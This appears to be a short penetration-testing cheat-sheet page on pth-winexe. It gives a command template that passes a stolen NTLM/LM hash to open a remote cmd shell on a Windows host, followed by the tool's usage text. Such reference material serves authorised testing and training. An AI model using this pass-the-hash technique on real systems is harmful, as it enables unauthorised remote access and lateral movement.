# pth-winexe
Pass the hash with pth-winexe generally will require a hash but `-N` for no authenication is possible. [Github page](https://github.com/byt3bl33d3r/pth-toolkit).

```bash
# Use user and there hash to create a remote cmd prompt
pth-winexe -U <username>%<NTLM/LM hash> //$IP cmd
```

## Usage

```bash
winexe version 1.1
This program may be freely redistributed under the terms of the GNU GPLv3
Usage: winexe [OPTION]... //HOST COMMAND
Options:
  -h, --help                                  Display help message
  -V, --version                               Display version number
  -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
  -A, --authentication-file=FILE              Get the credentials from a file
  -N, --no-pass                               Do not ask for a password
  -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
  -d, --debuglevel=DEBUGLEVEL                 Set debug level
      --uninstall                             Uninstall winexe service after remote execution
      --reinstall                             Reinstall winexe service before remote execution
      --system                                Use SYSTEM account
      --profile                               Load user profile
      --convert                               Try to convert characters between local and remote code-pages
      --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)
      --runas-file=FILE                       Run as user options defined in a file
      --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.
      --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.
```



